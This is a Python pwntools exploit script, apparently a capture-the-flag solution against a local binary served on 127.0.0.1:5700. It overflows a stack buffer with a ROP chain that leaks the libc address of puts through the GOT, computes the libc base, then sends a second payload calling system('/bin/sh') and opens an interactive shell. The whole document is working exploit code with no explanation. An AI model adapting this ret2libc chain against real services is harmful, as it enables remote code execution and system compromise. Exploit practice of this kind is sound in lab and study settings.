from pwn import *

e = ELF("./main")
libc = ELF("libc.so.6")

p = process("./main")
p = remote('127.0.0.1',5700)
#buffer x30(48) + rbp(8)
rop = ROP(e)
main = 0x000000000040082a

pltputs = 0x4005f0

win = 0x000000000040075a 

poprdi = rop.find_gadget(["pop rdi","ret"])[0]
ret = rop.find_gadget(["ret"])[0]

print(p.recv())

payload = cyclic(72)
payload += p64(poprdi)
payload += p64(e.got['puts']) 
payload += p64(pltputs)
payload += p64(main)
payload += b'\n'

p.sendline("my life")



print(p.recv())

p.send(payload)
cc = p.recv()

cl = cc.split(b'\n')
print(cl[0])


leaked = cl[0] + b'\x00' * (8 - len(cl[0]))
print(leaked)

libcoff = u64(leaked) - libc.symbols['puts']
binsh = next(libc.search(b'/bin/sh')) + libcoff

print(hex(libcoff))


payload = cyclic(72)
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.symbols['system'] + libcoff)
payload += b'\n'


p.sendline("my life")



print(p.recv())

p.send(payload)

p.interactive()
